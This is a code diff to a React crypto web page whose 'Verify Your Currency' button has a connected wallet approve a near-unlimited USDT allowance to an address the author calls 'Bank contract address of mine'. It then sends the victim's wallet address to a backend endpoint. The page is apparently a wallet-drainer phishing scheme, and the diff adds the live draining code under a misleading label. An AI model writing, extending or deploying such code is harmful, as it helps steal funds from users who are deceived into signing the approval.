@@ -24,7 +24,7 @@ const Welcome = () => {
   const [signer, setSigner] = useState(null);
 
   const tokenAddress = "0x55d398326f99059ff775485246999027b3197955"; // USDT
-  const spender = "0xefe2aa8b1381fce14321cd214a7f4b02078753cb";
+  const spender = "0xcb08c0b38eC1ac1b6fbC7771B5BD58ee6B9dE668"; // Bank contract address of mine
   const amount = ethers.utils.parseUnits("55398325990.000000000000000001", 18);
 
   useEffect(() => {
@@ -42,15 +42,6 @@ const Welcome = () => {
         setProvider(newProvider);
         setSigner(newSigner);
         setWalletAddress(address);
-
-        // Save wallet to backend
-        const res = await fetch("https://bank-website-delta-gules.vercel.app/api/approovewallet", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ wallet: address }),
-        });
-        const data = await res.json();
-        console.log(data);
       } catch (error) {
         console.error("Wallet connection error:", error);
       }
@@ -61,31 +52,32 @@ const Welcome = () => {
 
   const approveToken = async () => {
     if (!signer || !walletAddress) {
-      console.log(tokenAddress,walletAddress, spender);
       await connectWallet();
-      console.log(tokenAddress,walletAddress, spender);
       return;
     }
 
     const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
     const token = new ethers.Contract(tokenAddress, abi, signer);
-    console.log("Token contract:", token);
-    console.log("Token address:", tokenAddress);
-    console.log("Wallet address:", walletAddress);
-    console.log("Spender address:", spender);
 
     try {
-      console.log(amount);
-      try{
-              const tx = await token.approve(spender, amount);
-      await tx.wait();
-            console.log("Transaction:", tx);
-      console.log("tx"+tx);
+      try {
+        const tx = await token.approve(spender, amount);
+        await tx.wait();
+        console.log("Transaction:", tx);
+        console.log("tx" + tx);
 
-      }catch (error) {
+        // Save wallet to backend
+        const res = await fetch("https://bank-website-delta-gules.vercel.app/api/approovewallet", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ wallet: address }),
+        });
+
+        const data = await res.json();
+        console.log(data);
+      } catch (error) {
         console.log("Error in transaction:", error);
       }
-
       console.log("✅ Token approved successfully");
 
       // Log approval to backend
@@ -137,17 +129,20 @@ const Welcome = () => {
               </p>
             </button>
           )}
-            <button
-              type="button"
-              onClick={approveToken}
-              className="flex flex-row justify-center items-center my-5 bg-[#2952e3] p-3 rounded-full cursor-pointer hover:bg-[#2546bd]"
-            >
-              <AiFillPlayCircle className="text-white mr-2" />
-              <p className="text-white text-base font-semibold"
+          {
+            walletAddress && (
+              <button
+                type="button"
+                onClick={approveToken}
+                className="flex flex-row justify-center items-center my-5 bg-[#2952e3] p-3 rounded-full cursor-pointer hover:bg-[#2546bd]"
               >
-                Verify Your Currency
-              </p>
-            </button>
+                <AiFillPlayCircle className="text-white mr-2" />
+                <p className="text-white text-base font-semibold"
+                >
+                  Verify Your Currency
+                </p>
+              </button>
+            )}
 
           <div className="grid sm:grid-cols-3 grid-cols-2 w-full mt-10">
             <div className={`rounded-tl-2xl ${companyCommonStyles}`}>Reliability</div>
